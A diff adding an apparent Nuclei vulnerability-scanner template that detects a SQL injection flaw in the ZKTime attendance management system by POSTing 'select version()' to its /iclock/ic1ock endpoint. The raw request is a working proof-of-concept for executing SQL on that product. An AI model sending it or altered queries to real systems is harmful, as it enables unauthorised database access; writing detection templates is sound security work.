@@ -1,0 +1,28 @@
+id: ZKTime-ic1ock-sql
+
+info:
+  name: ZKTime 熵基智能考勤管理系统 ic1ock SQL注入漏洞
+  author: ZKTime
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /iclock/ic1ock HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select version()
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '执行 select version() 成功'
+          - '执行 SQL 语句'
+        condition: and
+      - type: status
+        status: 
+          - 200
